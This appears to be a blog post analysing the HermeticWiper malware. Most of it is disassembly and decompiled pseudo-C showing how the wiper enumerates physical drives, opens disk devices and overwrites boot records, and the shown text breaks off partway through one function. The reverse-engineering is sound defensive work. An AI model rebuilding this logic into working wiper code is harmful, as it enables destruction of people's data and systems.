---
layout: post
title: "Russo-Ukrainian War - Hermeticwiper Malware Analysis"
date: 2022-02-27
---

<h2>Introduction</h2>  
Following the beginning of the recent conflict between Ukraine and Russia, cybersecurity hopped to the forefront of the news. Amid a litany of other electronic warfare efforts, this malware was observed on systems in Ukraine on February 24th 2022. A signed driver delivers a wiper which corrupts the MBR (master boot record). The MBR on each drive is used to indicate where partitions are and is a necessary component of booting. Once corrupted, the operating system will not load and a computer cannot boot. The following is an analysis of sample ```SHA256 1bc44eef75779e3ca1eefb8ff5a64807dbc942b1e4a2672d77b9f6928d292591``` which I obtained the evening of February 24th, posting my initial findings on February 25th. I was certainly not the first to do so and many folks in infosec did commendable work to reverse this sample.   

NOTE: This is a continuous work in progress and I am updating periodically.  
```  

TODO: 
//headers analysis
//analyze kernal32.dll use
//continue to follow refs to appdata, mydocs, etc to see if benign

```  

This file is in the .exe PE format (portable executable). This data structure is windows-specific and tells the operating system what is necessary to manage the wrapped executable code. We will focus on the following:  
```  

Type: PE
Platform: windows-x86
Architecture: x86
SHA256: 1bc44eef75779e3ca1eefb8ff5a64807dbc942b1e4a2672d77b9f6928d292591

Libraries: 
  SHLWAPI.dll
  LZ32.dll
  msvcrt.dll
  KERNEL32.dll
  USER32.dll
  ADVAPI32.dll
  SHELL32.dll

Segments:  
r-x  0x00401000-0x00404feb  {Code} // note that code has read permissions as well as execute permissions  
r--  0x00405000-0x004062fa  {Data} // note that data mearly has read permissions  

Sections:  
0x00401000-0x00404feb  .text  {Code} // big bad spooky malware  
0x00405000-0x00405a53  .rdata  {Read-only data} // constant/read only data  
0x00405a54-0x004062fa  .idata  {Read-only data} // import directory of functions  

```  


<h2>Code</h2>  
Within the executable we can see that at address ```0x00401d6d``` physical drives are being mapped.  
```  

Dissassembly:  
-------------  
00401d60  int32_t __stdcall enumerate_drives(int32_t return_value @ ecx, int32_t arg2 @ edx, int32_t arg3)

00401d60  push    ebp {__saved_ebp}
00401d61  mov     ebp, esp {__saved_ebp}
00401d63  sub     esp, 0x260
00401d69  push    ebx {__saved_ebx}  {0x0}
00401d6a  push    esi {__saved_esi}
00401d6b  push    edi {__saved_edi}
00401d6c  push    ecx {var_274}
00401d6d  push    0x4051a8 {var_278}  {"\\.\PhysicalDrive%u"}
00401d72  xorps   xmm0, xmm0
00401d75  mov     dword [ebp-0x1c {var_20}], edx
00401d78  lea     eax, [ebp-0x25c {destination_address}]
00401d7e  mov     dword [ebp-0x10 {var_14}], 0x0
00401d85  push    0x104 {var_27c}
00401d8a  xor     esi, esi  {0x0}
00401d8c  movq    qword [ebp-0x24 {var_28}], xmm0
00401d91  xor     edi, edi  {0x0}
00401d93  mov     dword [ebp-0xc {bytes_read_var}], esi  {0x0}
00401d96  push    eax {destination_address} {var_280}
00401d97  movups  xmmword [ebp-0x44 {var_48}], xmm0
00401d9b  mov     dword [ebp-0x18 {var_1c}], edi  {0x0}
00401d9e  movups  xmmword [ebp-0x34 {num_bytes_to_read}], xmm0
00401da2  call    dword [wnsprintfW]
00401da8  add     esp, 0x10
00401dab  lea     eax, [ebp-0x50 {var_54}]
00401dae  lea     edx, [ebp-0x44 {var_48}]
00401db1  lea     ecx, [ebp-0x25c {destination_address}]
00401db7  push    eax {var_54} {var_274_1}
00401db8  call    get_file_handle
00401dbd  mov     ebx, eax
00401dbf  cmp     ebx, 0xffffffff
00401dc2  je      0x401f73

00401dc8  test    ebx, ebx
00401dca  je      0x401fa8

00401dd0  mov     edi, 0x24c0
00401dd5  push    edi  {0x24c0}
00401dd6  push    0x8 {var_278}
00401dd8  call    dword [GetProcessHeap]
00401dde  push    eax {var_27c_1}
00401ddf  call    dword [HeapAlloc]
00401de5  push    0x0
00401de7  mov     esi, eax
00401de9  lea     eax, [ebp-0xc {bytes_read_var}]
00401dec  push    eax {bytes_read_var} {var_278_1}
00401ded  push    edi {var_27c}  {0x24c0}
00401dee  push    esi {var_280_1}
00401def  push    0x0 {var_284}
00401df1  push    0x0 {var_288}
00401df3  push    0x70050 {var_28c}
00401df8  push    ebx {var_290_1}
00401df9  call    dword [DeviceIoControl]
00401dff  call    dword [GetLastError]
00401e05  cmp     eax, 0x7a
00401e08  jne     0x401e71

00401e0a  nop     word [eax+eax], ax

00401e10  push    esi {var_274_2}
00401e11  push    0x0 {var_278}
00401e13  call    dword [GetProcessHeap]
00401e19  push    eax {var_27c_2}
00401e1a  call    dword [HeapFree]
00401e20  add     edi, 0x90
00401e26  xor     esi, esi  {0x0}
00401e28  cmp     edi, 0x48c0
00401e2e  jae     0x401f71

00401e34  push    edi {var_274_3}
00401e35  push    0x8 {var_278}
00401e37  call    dword [GetProcessHeap]
00401e3d  push    eax {var_27c_3}
00401e3e  call    dword [HeapAlloc]
00401e44  mov     esi, eax
00401e46  test    esi, esi
00401e48  je      0x401f6b

00401e4e  push    0x0
00401e50  lea     eax, [ebp-0xc {bytes_read_var}]
00401e53  push    eax {bytes_read_var} {var_278_2}
00401e54  push    edi {var_27c_4}
00401e55  push    esi {var_280_2}
00401e56  push    0x0 {var_284}
00401e58  push    0x0 {var_288}
00401e5a  push    0x70050 {var_28c}
00401e5f  push    ebx {var_290_2}
00401e60  call    dword [DeviceIoControl]
00401e66  call    dword [GetLastError]
00401e6c  cmp     eax, 0x7a
00401e6f  je      0x401e10

00401e71  test    esi, esi
00401e73  je      0x401f71

00401e79  mov     eax, dword [esi]
00401e7b  mov     dword [ebp-0x10 {var_14}], 0x1
00401e82  cmp     eax, 0x2
00401e85  je      0x401e94

00401e87  test    eax, eax
00401e89  je      0x401e94

00401e8b  cmp     eax, 0x1
00401e8e  jne     0x401fa3

00401e94  cmp     dword [esi+0x4], 0x0
00401e98  mov     dword [ebp-0x14 {var_18_1}], 0x0
00401e9f  jbe     0x401fa3

00401ea5  mov     edx, dword [ebp-0x30 {num_bytes_to_read+0x4}]
00401ea8  lea     eax, [esi+0x30]
00401eab  mov     dword [ebp-0x8 {distance_to_move}], eax
00401eae  nop     

00401eb0  mov     eax, dword [eax]
00401eb2  test    eax, eax
00401eb4  je      0x401ebf

00401eb6  cmp     eax, 0x1
00401eb9  jne     0x401fa3

00401ebf  push    edx {var_274_4}
00401ec0  push    0x0 {var_278}
00401ec2  call    dword [GetProcessHeap]
00401ec8  push    eax {var_27c_5}
00401ec9  call    dword [HeapAlloc]
00401ecf  mov     edi, eax
00401ed1  mov     dword [ebp-0x18 {var_1c}], edi
00401ed4  test    edi, edi
00401ed6  je      0x401f9d

00401edc  mov     eax, dword [ebp-0x8 {distance_to_move}]
00401edf  push    0x0
00401ee1  push    0x0 {var_278}
00401ee3  push    dword [eax+0xc] {var_27c_6}
00401ee6  push    dword [eax+0x8] {var_280_3}
00401ee9  push    ebx {var_284_1}
00401eea  call    dword [SetFilePointerEx]
00401ef0  test    eax, eax
00401ef2  je      0x401f9d  // SetFilePointerEx moves the file pointer of the specified file.

00401ef8  push    0x0
00401efa  lea     eax, [ebp-0xc {bytes_read_var}]
00401efd  push    eax {bytes_read_var} {var_278_3}
00401efe  push    dword [ebp-0x30 {num_bytes_to_read+0x4}] {var_27c_7}
00401f01  push    edi {var_280_4}
00401f02  push    ebx {var_284_2}
00401f03  call    dword [ReadFile]
00401f09  test    eax, eax
00401f0b  je      0x401f9d

00401f11  mov     edx, dword [ebp-0x30 {num_bytes_to_read+0x4}]
00401f14  cmp     edx, 0x200
00401f1a  jb      0x401f4b

00401f1c  cmp     word [edi+0xb], 0x0
00401f21  jne     0x401f34

00401f23  test    edx, edx
00401f25  movzx   eax, dx
00401f28  mov     ecx, 0x200
00401f2d  cmovne  ecx, eax
00401f30  mov     word [edi+0xb], cx

00401f34  mov     eax, dword [ebp-0x8 {distance_to_move}]
00401f37  push    dword [eax+0xc] {var_274_5}
00401f3a  push    dword [eax+0x8] {var_278_4}
00401f3d  push    dword [ebp-0x4c {var_50}] {var_27c_8}
00401f40  push    dword [ebp-0x1c {var_20}] {var_280_5}
00401f43  push    edi {var_284_3}
00401f44  push    ebx {var_288_1}
00401f45  call    dword [ebp+0x8 {arg3}]
00401f48  mov     edx, dword [ebp-0x30 {num_bytes_to_read+0x4}]

00401f4b  mov     ecx, dword [ebp-0x14 {var_18_1}]
00401f4e  mov     eax, dword [ebp-0x8 {distance_to_move}]
00401f51  inc     ecx
00401f52  add     eax, 0x90
00401f57  mov     dword [ebp-0x14 {var_18_1}], ecx
00401f5a  mov     dword [ebp-0x8 {distance_to_move}], eax
00401f5d  cmp     ecx, dword [esi+0x4]
00401f60  jb      0x401eb0

00401f66  mov     edi, dword [ebp-0x18 {var_1c}]
00401f69  jmp     0x401f73

00401f6b  call    dword [GetLastError]

00401f71  xor     edi, edi  {0x0}

00401f73  test    ebx, ebx
00401f75  je      0x401f83

00401f77  cmp     ebx, 0xffffffff
00401f7a  je      0x401f83

00401f7c  push    ebx {var_274_6}
00401f7d  call    dword [CloseHandle]

00401f83  mov     ebx, dword [GetProcessHeap]
00401f89  test    esi, esi
00401f8b  je      0x401fb3

00401f8d  push    esi {var_274_7}
00401f8e  push    0x0 {var_278}
00401f90  call    ebx
00401f92  mov     esi, dword [HeapFree]
00401f98  push    eax {var_27c_9}
00401f99  call    esi
00401f9b  jmp     0x401fb9

00401f9d  call    dword [GetLastError]

00401fa3  mov     edi, dword [ebp-0x18 {var_1c}]
00401fa6  jmp     0x401f73

00401fa8  xor     eax, eax  {0x0}
00401faa  pop     edi {__saved_edi}
00401fab  pop     esi {__saved_esi}
00401fac  pop     ebx {__saved_ebx}  {0x0}
00401fad  mov     esp, ebp
00401faf  pop     ebp {__saved_ebp}
00401fb0  retn    0x4 {__return_addr}

00401fb3  mov     esi, dword [HeapFree]

00401fb9  test    edi, edi
00401fbb  je      0x401fc5

00401fbd  push    edi {var_274_8}
00401fbe  push    0x0 {var_278}
00401fc0  call    ebx
00401fc2  push    eax {var_27c_10}
00401fc3  call    esi

00401fc5  mov     eax, dword [ebp-0x10 {var_14}]
00401fc8  pop     edi {__saved_edi}
00401fc9  pop     esi {__saved_esi}
00401fca  pop     ebx {__saved_ebx}  {0x0}
00401fcb  mov     esp, ebp
00401fcd  pop     ebp {__saved_ebp}
00401fce  retn    0x4 {__return_addr}


Psuedo C Code:  
--------------  
00401d60  int32_t __stdcall enumerate_drives(int32_t return_value @ ecx, int32_t arg2 @ edx, int32_t arg3)

00401d60  {
00401d72      int128_t xmm0 = 0;
00401d7e      int32_t var_14 = 0;
00401d8a      LPVOID output_buffer = nullptr;
00401d8c      int64_t var_28 = xmm0;
00401d91      LPVOID edi = nullptr;
00401d93      int32_t bytes_read_var = 0;
00401d97      int128_t var_48 = xmm0;
00401d9b      LPVOID var_1c = nullptr;
00401d9e      int64_t num_bytes_to_read = xmm0;
00401da2      void destination_address;
00401da2      wnsprintfW(&destination_address, 0x104, 0x4051a8, return_value);  // {"\\.\PhysicalDrive%u"}
00401db8      void var_54;
00401db8      HANDLE handle_to_file = get_file_handle(&destination_address, &var_48, &var_54);
00401dc2      if (handle_to_file != 0xffffffff)
00401dbf      {
00401dca          if (handle_to_file == 0)
00401dc8          {
00401fb0              return 0;
00401fb0          }
00401dd0          DWORD output_buffer_size = 0x24c0;
00401de7          output_buffer = HeapAlloc(GetProcessHeap(), 8, 0x24c0);
00401df9          DeviceIoControl(handle_to_file, 0x70050, nullptr, 0, output_buffer, 0x24c0, &bytes_read_var, nullptr);
00401e08          if (GetLastError() == 0x7a)
00401e05          {
00401e6f              DWORD eax_6;
00401e6f              do
00401e6f              {
00401e1a                  HeapFree(GetProcessHeap(), 0, output_buffer);
00401e20                  output_buffer_size = (output_buffer_size + 0x90);
00401e26                  output_buffer = nullptr;
00401e2e                  if (output_buffer_size >= 0x48c0)
00401e28                  {
00401e2e                      break;
00401e2e                  }
00401e44                  output_buffer = HeapAlloc(GetProcessHeap(), 8, output_buffer_size);
00401e48                  if (output_buffer == 0)
00401e46                  {
00401f6b                      GetLastError();
00401f6b                      break;
00401f6b                  }
00401e60                  DeviceIoControl(handle_to_file, 0x70050, nullptr, 0, output_buffer, output_buffer_size, &bytes_read_var, nullptr);
00401e66                  eax_6 = GetLastError();
00401e66              } while (eax_6 == 0x7a);
00401e48              if ((output_buffer_size < 0x48c0 && output_buffer == 0))
00401e46              {
00401e71                  goto label_401f71;
00401e71              }
00401e71          }
00401e73          if (output_buffer == 0)
00401e71          {
00401f71          label_401f71:
00401f71              edi = nullptr;
00401f71          }
00401e79          else
00401e79          {
00401e79              int32_t eax_7 = *(int32_t*)output_buffer;
00401e7b              var_14 = 1;
00401e8e              if (((eax_7 == 2 || eax_7 == 0) || eax_7 == 1))
00401e8b              {
00401e98                  int32_t var_18_1 = 0;
00401e9f                  if (*(int32_t*)(output_buffer + 4) > 0)
00401e94                  {
00401ea5                      SIZE_T edx_1 = *(int32_t*)((char*)num_bytes_to_read)[4];
00401ea8                      void* eax_8 = (output_buffer + 0x30);
00401eab                      void* distance_to_move = eax_8;
00401eb0                      while (true)
00401eb0                      {
00401eb0                          eax_8 = *(int32_t*)eax_8;
00401eb9                          if ((eax_8 != 0 && eax_8 != 1))
00401eb6                          {
00401eb9                              goto label_401fa3;
00401eb9                          }
00401ec9                          LPVOID buffer_to_receive = HeapAlloc(GetProcessHeap(), 0, edx_1);
00401ed1                          var_1c = buffer_to_receive;
00401ed6                          if (buffer_to_receive != 0)
00401ed4                          {
00401ee3                              int32_t var_27c_6 = *(int32_t*)((char*)distance_to_move + 0xc);
00401ef2                              // SetFilePointerEx moves the file pointer of the specified file.
00401ef2                              if ((SetFilePointerEx(handle_to_file, *(int32_t*)((char*)distance_to_move + 8), nullptr, 0) != 0 && ReadFile(handle_to_file, buffer_to_receive, *(int32_t*)((char*)num_bytes_to_read)[4], &bytes_read_var, nullptr) != 0))
00401f09                              {
00401f11                                  edx_1 = *(int32_t*)((char*)num_bytes_to_read)[4];
00401f1a                                  if (edx_1 >= 0x200)
00401f14                                  {
00401f21                                      if (*(int16_t*)(buffer_to_receive + 0xb) == 0)
00401f1c                                      {
00401f25                                          int16_t eax_13 = edx_1;
00401f28                                          int16_t ecx_1 = 0x200;
00401f2d                                          if (edx_1 != 0)
00401f23                                          {
00401f2d                                              ecx_1 = eax_13;
00401f2d                                          }
00401f30                                          *(int16_t*)(buffer_to_receive + 0xb) = ecx_1;
00401f30                                      }
00401f45                                      int32_t var_50;
00401f45                                      arg3(handle_to_file, buffer_to_receive, arg2, var_50, *(int32_t*)((char*)distance_to_move + 8), *(int32_t*)((char*)distance_to_move + 0xc));
00401f48                                      edx_1 = *(int32_t*)((char*)num_bytes_to_read)[4];
00401f48                                  }
00401f51                                  int32_t ecx_3 = (var_18_1 + 1);
00401f52                                  eax_8 = ((char*)distance_to_move + 0x90);
00401f57                                  var_18_1 = ecx_3;
00401f5a                                  distance_to_move = eax_8;
00401f60                                  if (ecx_3 >= *(int32_t*)(output_buffer + 4))
00401f5d                                  {
00401f60                                      break;
00401f60                                  }
00401f60                                  continue;
00401f60                              }
00401f09                          }
00401f9d                          GetLastError();
00401f9d                          goto label_401fa3;
00401f9d                      }
00401f66                      edi = var_1c;
00401f66                  }
00401e82              }
00401e8e              if (((((eax_7 == 2 || eax_7 == 0) || eax_7 == 1) && *(int32_t*)(output_buffer + 4) <= 0) || ((eax_7 != 2 && eax_7 != 0) && eax_7 != 1)))
00401e8b              {
00401fa3              label_401fa3:
00401fa3                  edi = var_1c;
00401fa3              }
00401e82          }
00401e82      }
00401f7a      if ((handle_to_file != 0 && handle_to_file != 0xffffffff))
00401f77      {
00401f7d          CloseHandle(handle_to_file);
00401f7d      }
00401f8b      if (output_buffer != 0)
00401f89      {
00401f99          HeapFree(GetProcessHeap(), 0, output_buffer);
00401f99      }
00401fbb      if (edi != 0)
00401fb9      {
00401fc3          HeapFree(GetProcessHeap(), 0, edi);
00401fc3      }
00401fce      return var_14;
00401fce  }

  
```  


Further down, we see ```EPMNTDRV%U``` for each drive which specifically manages our partitions, as well as where the file handle is pulled for it to be overwritten:  
```  

Dissassembly:  
-------------  
004026a0  DWORD __stdcall MBR_Overwrite(void* string)
004026a0  push    ebp {__saved_ebp}
004026a1  mov     ebp, esp {__saved_ebp}
004026a3  and     esp, 0xfffffff8
004026a6  sub     esp, 0x244
004026ac  push    ebx {__saved_ebx}  {0x0}
004026ad  push    esi {__saved_esi}
004026ae  push    edi {__saved_edi}
004026af  mov     edi, dword [ebp+0x8 {string}]
004026b2  test    edi, edi
004026b4  jne     0x4026c4

004026b6  mov     eax, 0x57
004026bb  pop     edi {__saved_edi}
004026bc  pop     esi {__saved_esi}
004026bd  pop     ebx {__saved_ebx}  {0x0}
004026be  mov     esp, ebp
004026c0  pop     ebp {__saved_ebp}
004026c1  retn    0x4 {__return_addr}

004026c4  mov     esi, dword [edi+0x8]
004026c7  test    esi, esi
004026c9  je      0x4026b6

004026cb  push    dword [edi+0xc] {var_25c}
004026ce  lea     eax, [esp+0x4c {output_pointer}]
004026d2  mov     dword [esp+0x14 {number_of_bytes_written}], 0x0
004026da  push    0x4051d0 {var_260}  {"\\.\EPMNTDRV\%u"}
004026df  push    0x104 {var_264}
004026e4  push    eax {output_pointer} {var_268}
004026e5  // wnsprintfW takes a variable-length argument list and returns the values of the arguments as a printf-style formatted 
004026e5  // string.
004026e5  call    dword [wnsprintfW]
004026eb  add     esp, 0x10
004026ee  lea     edx, [esp+0x20 {var_238}]
004026f2  lea     ecx, [esp+0x48 {output_pointer}]
004026f6  push    0x0
004026f8  call    get_file_handle
004026fd  mov     ebx, eax
004026ff  test    ebx, ebx
00402701  je      0x4027bd

00402707  cmp     ebx, 0xffffffff
0040270a  je      0x4027bd

00402710  mov     eax, dword [edi+0x10]
00402713  mov     dword [esp+0x1c {var_23c_1}], eax
00402717  mov     eax, dword [edi+0x14]
0040271a  mov     dword [esp+0x14 {var_244_1}], eax
0040271e  nop     

00402720  mov     ecx, dword [esi+0x10]
00402723  mov     edi, dword [esi+0x8]
00402726  add     ecx, edi
00402728  mov     edx, dword [esi+0xc]
0040272b  mov     eax, dword [esi+0x14]
0040272e  adc     eax, edx
00402730  mov     dword [esp+0x18 {var_240_1}], edx
00402734  cmp     edx, eax
00402736  jg      0x4027a4

00402738  jl      0x402740

0040273a  cmp     edi, ecx
0040273c  jae     0x4027a4

0040273e  nop     

00402740  push    0x0
00402742  push    0x0 {var_260}
00402744  push    edx {var_264_1}
00402745  push    edi {var_268_1}
00402746  push    ebx {var_26c_1}
00402747  mov     dword [esp+0x24 {number_of_bytes_written}], 0x0
0040274f  call    dword [SetFilePointerEx]
00402755  test    eax, eax
00402757  jne     0x40275f  // SetFilePointer moves the file pointer of the specified file.

00402759  call    dword [GetLastError]

0040275f  push    0x0
00402761  lea     eax, [esp+0x14 {number_of_bytes_written}]
00402765  push    eax {number_of_bytes_written} {var_260_1}
00402766  push    dword [esp+0x1c {var_244_1}] {var_264_2}
0040276a  push    dword [esp+0x28 {var_23c_1}] {var_268_2}
0040276e  push    ebx {var_26c_2}
0040276f  call    dword [WriteFile]
00402775  test    eax, eax
00402777  jne     0x40277f  // WriteFile writes data to the specified file or input/output (I/O) device.

00402779  call    dword [GetLastError]

0040277f  add     edi, dword [esp+0x14 {var_244_1}]
00402783  mov     edx, dword [esp+0x18 {var_240_1}]
00402787  mov     ecx, dword [esi+0x10]
0040278a  adc     edx, 0x0
0040278d  add     ecx, dword [esi+0x8]
00402790  mov     eax, dword [esi+0x14]
00402793  adc     eax, dword [esi+0xc]
00402796  mov     dword [esp+0x18 {var_240_1}], edx
0040279a  cmp     edx, eax
0040279c  jl      0x402740

0040279e  jg      0x4027a4

004027a0  cmp     edi, ecx
004027a2  jb      0x402740

004027a4  mov     eax, dword [ebp+0x8 {string}]
004027a7  mov     esi, dword [esi]
004027a9  cmp     esi, dword [eax+0x8]
004027ac  jne     0x402720

004027b2  push    ebx {var_25c_1}
004027b3  call    dword [FlushFileBuffers]
004027b9  test    eax, eax
004027bb  jne     0x4027c7

004027bd  call    dword [GetLastError]
004027c3  mov     esi, eax
004027c5  jmp     0x4027c9

004027c7  xor     esi, esi  {0x0}

004027c9  test    ebx, ebx
004027cb  je      0x4027d9

004027cd  cmp     ebx, 0xffffffff
004027d0  je      0x4027d9

004027d2  push    ebx {var_25c_2}
004027d3  call    dword [CloseHandle]

004027d9  pop     edi {__saved_edi}
004027da  mov     eax, esi
004027dc  pop     esi {__saved_esi}
004027dd  pop     ebx {__saved_ebx}  {0x0}
004027de  mov     esp, ebp
004027e0  pop     ebp {__saved_ebp}
004027e1  retn    0x4 {__return_addr}


Psuedo C Code:  
--------------  
004026a0  DWORD __stdcall MBR_Overwrite(void* string)

004026a0  {
004026b4      if (string != 0)
004026b2      {
004026c4          void** esi_1 = *(int32_t*)((char*)string + 8);
004026c9          if (esi_1 != 0)
004026c7          {
004026d2              int32_t number_of_bytes_written = 0;
004026e5              // wnsprintfW takes a variable-length argument list and returns the values of the arguments as a printf-style formatted 
004026e5              // string.
004026e5              void output_pointer;
004026e5              wnsprintfW(&output_pointer, 0x104, 0x4051d0, *(int32_t*)((char*)string + 0xc));  // {"\\.\EPMNTDRV\%u"}
004026f8              void var_238;
004026f8              HANDLE handle_to_file = get_file_handle(&output_pointer, &var_238, nullptr);
0040270a              BOOL eax_10;
0040270a              if ((handle_to_file != 0 && handle_to_file != 0xffffffff))
00402707              {
00402710                  LPCVOID eax_1 = *(int32_t*)((char*)string + 0x10);
00402717                  DWORD eax_2 = *(int32_t*)((char*)string + 0x14);
004027ac                  do
004027ac                  {
00402720                      int32_t ecx_1 = esi_1[4];
00402723                      int32_t edi_1 = esi_1[2];
00402728                      int32_t edx_1 = esi_1[3];
0040272e                      int32_t eax_4 = (esi_1[5] + edx_1);
00402730                      int32_t var_240_1 = edx_1;
00402734                      bool cond:0_1 = edx_1 < eax_4;
0040273c                      if ((edx_1 <= eax_4 && (cond:0_1 || ((!cond:0_1) && edi_1 < (ecx_1 + edi_1)))))
00402726                      {
00402744                          while (true)
00402744                          {
00402744                              int32_t var_264_1 = edx_1;
00402747                              number_of_bytes_written = 0;
00402757                              // SetFilePointer moves the file pointer of the specified file.
00402757                              if (SetFilePointerEx(handle_to_file, edi_1, nullptr, 0) == 0)
00402755                              {
00402759                                  GetLastError();
00402759                              }
00402777                              // WriteFile writes data to the specified file or input/output (I/O) device.
00402777                              if (WriteFile(handle_to_file, eax_1, eax_2, &number_of_bytes_written, nullptr) == 0)
00402775                              {
00402779                                  GetLastError();
00402779                              }
0040277f                              int32_t temp2_1 = edi_1;
0040277f                              edi_1 = (edi_1 + eax_2);
00402787                              int32_t ecx_3 = esi_1[4];
0040278a                              edx_1 = (var_240_1 + 0);
0040278d                              int32_t ecx_4 = (ecx_3 + esi_1[2]);
00402793                              int32_t eax_8 = (esi_1[5] + esi_1[3]);
00402796                              var_240_1 = edx_1;
0040279a                              bool cond:1_1 = edx_1 > eax_8;
0040279c                              if (edx_1 >= eax_8)
0040279a                              {
0040279e                                  if (cond:1_1)
0040279e                                  {
0040279e                                      break;
0040279e                                  }
004027a2                                  if (edi_1 >= ecx_4)
004027a0                                  {
004027a2                                      break;
004027a2                                  }
004027a2                              }
0040279c                          }
0040279c                      }
004027a7                      esi_1 = *(int32_t*)esi_1;
004027a7                  } while (esi_1 != *(int32_t*)((char*)string + 8));
004027b3                  eax_10 = FlushFileBuffers(handle_to_file);
004027b3              }
004027bb              DWORD esi_2;
004027bb              if (((handle_to_file == 0 || handle_to_file == 0xffffffff) || ((handle_to_file != 0 && handle_to_file != 0xffffffff) && eax_10 == 0)))
004027b9              {
004027c3                  esi_2 = GetLastError();
004027bd              }
004027bb              if (((handle_to_file != 0 && handle_to_file != 0xffffffff) && eax_10 != 0))
004027b9              {
004027c7                  esi_2 = 0;
004027c7              }
004027d0              if ((handle_to_file != 0 && handle_to_file != 0xffffffff))
004027cd              {
004027d3                  CloseHandle(handle_to_file);
004027d3              }
004027e1              return esi_2;
004027e1          }
004026d2      }
004026c1      return 0x57;
004026c1  }
  
```  

```  

Dissassembly:  
-------------  
00401870  HANDLE __stdcall get_file_handle(LPCWSTR file_name @ ecx, int128_t* output_buffer_count @ edx, int64_t* arg3)
00401870  push    ebp {__saved_ebp}
00401871  mov     ebp, esp {__saved_ebp}
00401873  sub     esp, 0x40
00401876  push    ebx {__saved_ebx}  {0x0}
00401877  push    esi {__saved_esi}
00401878  push    edi {__saved_edi}
00401879  mov     edi, edx
0040187b  test    ecx, ecx
0040187d  je      0x40197a

00401883  push    0x0
00401885  push    0x80000000 {var_58}  {0x80000000}
0040188a  push    0x3 {var_5c}
0040188c  push    0x0 {var_60}
0040188e  push    0x3 {var_64}
00401890  push    0xc0100180 {var_68}  {0xc0100180}
00401895  xorps   xmm0, xmm0
00401898  mov     dword [ebp-0xc {var_10}], 0x0
0040189f  push    ecx {var_6c}
004018a0  movq    qword [ebp-0x14 {output_buffer}], xmm0
004018a5  // CreateFileW creates or opens a file or I/O device\
004018a5  // In this instance it opens the file (file_name) if it exists (3) and writes operations directly to disc (0x80000000)
004018a5  call    dword [CreateFileW]
004018ab  mov     esi, eax
004018ad  test    esi, esi
004018af  je      0x401969

004018b5  cmp     esi, 0xffffffff
004018b8  je      0x401969

004018be  mov     ebx, dword [ebp+0x8 {arg3}]
004018c1  mov     eax, dword [DeviceIoControl]
004018c6  test    ebx, ebx
004018c8  je      0x401918

004018ca  push    0x0
004018cc  lea     ecx, [ebp-0x8 {bytes_returned}]
004018cf  push    ecx {bytes_returned} {var_58_1}
004018d0  push    0xc {var_5c}
004018d2  lea     ecx, [ebp-0x14 {output_buffer}]
004018d5  push    ecx {output_buffer} {var_60_1}
004018d6  push    0x0 {var_64}
004018d8  push    0x0 {var_68}
004018da  push    0x2d1080
004018df  push    esi {var_70_1}
004018e0  call    eax
004018e2  test    eax, eax
004018e4  // DeviceIoControl sends a control code directly to a specified device driver, causing the corresponding device to 
004018e4  // perform the corresponding operation.
004018e4  jne     0x4018fe

004018e6  call    dword [GetLastError]

004018ec  push    esi {var_54}
004018ed  call    dword [CloseHandle]
004018f3  xor     eax, eax  {0x0}
004018f5  pop     edi {__saved_edi}
004018f6  pop     esi {__saved_esi}
004018f7  pop     ebx {__saved_ebx}  {0x0}
004018f8  mov     esp, ebp
004018fa  pop     ebp {__saved_ebp}
004018fb  retn    0x4 {__return_addr}

004018fe  cmp     dword [ebp-0x14 {output_buffer}], 0x7
00401902  jne     0x4018ec

00401904  movq    xmm0, qword [ebp-0x14 {output_buffer}]
00401909  mov     eax, dword [ebp-0xc {var_10}]  {0x0}
0040190c  movq    qword [ebx], xmm0
00401910  mov     dword [ebx+0x8], eax  {0x0}
00401913  mov     eax, dword [DeviceIoControl]

00401918  test    edi, edi
0040191a  je      0x40195e

0040191c  push    0x0
0040191e  lea     ecx, [ebp-0x8 {bytes_returned}]
00401921  push    ecx {bytes_returned} {var_58_2}
00401922  push    0x28 {var_5c}
00401924  lea     ecx, [ebp-0x3c {output_buffer}]
00401927  push    ecx {output_buffer} {var_60_2}
00401928  push    0x0 {var_64}
0040192a  push    0x0 {var_68}
0040192c  push    0x700a0
00401931  push    esi {var_70_2}
00401932  call    eax
00401934  test    eax, eax
00401936  je      0x4018ec

00401938  mov     eax, dword [ebp-0x34 {output_buffer+0x8}]
0040193b  cmp     eax, 0xb
0040193e  je      0x401945

00401940  cmp     eax, 0xc
00401943  jne     0x4018ec

00401945  movups  xmm0, xmmword [ebp-0x3c {output_buffer}]
00401949  movups  xmmword [edi], xmm0
0040194c  movups  xmm0, xmmword [ebp-0x2c {var_30}]
00401950  movups  xmmword [edi+0x10], xmm0
00401954  movq    xmm0, qword [ebp-0x1c {var_20}]
00401959  movq    qword [edi+0x20], xmm0

0040195e  mov     eax, esi
00401960  pop     edi {__saved_edi}
00401961  pop     esi {__saved_esi}
00401962  pop     ebx {__saved_ebx}  {0x0}
00401963  mov     esp, ebp
00401965  pop     ebp {__saved_ebp}
00401966  retn    0x4 {__return_addr}

00401969  call    dword [GetLastError]
0040196f  mov     eax, esi
00401971  pop     edi {__saved_edi}
00401972  pop     esi {__saved_esi}
00401973  pop     ebx {__saved_ebx}  {0x0}
00401974  mov     esp, ebp
00401976  pop     ebp {__saved_ebp}
00401977  retn    0x4 {__return_addr}

0040197a  or      eax, 0xffffffff  {0xffffffff}
0040197d  pop     edi {__saved_edi}
0040197e  pop     esi {__saved_esi}
0040197f  pop     ebx {__saved_ebx}  {0x0}
00401980  mov     esp, ebp
00401982  pop     ebp {__saved_ebp}
00401983  retn    0x4 {__return_addr}


Psuedo C Code:  
--------------  
00401870  HANDLE __stdcall get_file_handle(LPCWSTR file_name @ ecx, int128_t* output_buffer_count @ edx, int64_t* arg3)

00401870  {
0040187d      if (file_name == 0)
0040187b      {
00401983          return 0xffffffff;
00401983      }
004018a0      int64_t output_buffer = 0;
004018a5      // CreateFileW creates or opens a file or I/O device\
004018a5      // In this instance it opens the file (file_name) if it exists (3) and writes operations directly to disc (0x80000000)
004018a5      HANDLE handle_to_file = CreateFileW(file_name, 0xc0100180, 3, nullptr, 3, 0x80000000, nullptr);
004018b8      if ((handle_to_file != 0 && handle_to_file != 0xffffffff))
004018b5      {
004018c8          void bytes_returned;
004018c8          if (arg3 != 0)
004018c6          {
004018e4              // DeviceIoControl sends a control code directly to a specified device driver, causing the corresponding device to 
004018e4              // perform the corresponding operation.
004018e4              if (DeviceIoControl(handle_to_file, 0x2d1080, nullptr, 0, &output_buffer, 0xc, &bytes_returned, nullptr) == 0)
004018e2              {
004018e6                  GetLastError();
004018ed              label_4018ed:
004018ed                  CloseHandle(handle_to_file);
004018fb                  return 0;
004018fb              }
00401902              if (output_buffer != 7)
004018fe              {
